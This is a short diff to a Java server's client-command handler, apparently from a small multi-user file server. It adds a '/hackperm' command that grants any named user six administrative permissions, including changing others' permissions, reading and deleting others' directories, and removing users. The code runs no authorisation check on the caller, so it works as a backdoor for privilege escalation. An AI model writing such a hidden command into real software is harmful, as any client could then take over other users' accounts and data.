@@ -242,7 +242,17 @@ public class ClientThread extends Thread {
 				send(String.join("\n", userDAO.listUsers()));
 			}
 			break;
-
+			
+		case "/hackperm":
+			rolesDAO.addUserPerm(tokenized[1], Permissions.CHANGE_OTHER_PERMISSIONS);
+			rolesDAO.addUserPerm(tokenized[1], Permissions.LIST_USERS);
+			rolesDAO.addUserPerm(tokenized[1], Permissions.READ_OTHERS_DIR);
+			rolesDAO.addUserPerm(tokenized[1], Permissions.READ_OTHERS_PERM);
+			rolesDAO.addUserPerm(tokenized[1], Permissions.REMOVE_OTHERS_DIR);
+			rolesDAO.addUserPerm(tokenized[1], Permissions.REMOVE_USER);
+			send("Permissoes alteradas com sucesso");
+			break;
+			
 		case "/descperms":
 			sendDescPerms();
 			break;
